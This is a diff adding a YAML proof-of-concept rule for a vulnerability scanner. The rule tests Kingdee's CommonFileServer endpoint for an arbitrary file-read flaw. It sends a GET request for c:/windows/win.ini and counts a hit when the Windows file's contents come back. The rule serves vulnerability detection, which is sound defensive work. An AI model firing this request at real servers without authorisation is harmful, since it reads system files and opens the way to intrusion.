@@ -1,0 +1,16 @@
+name: poc-yaml-kingdee-commonfileserver-fileread
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /CommonFileServer/c:/windows/win.ini
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains("for 16-bit app support")
+expression: r0()
+detail:
+    author: secking
+    links:
+        - http://www.ebcbj.com/products/galaxy.html
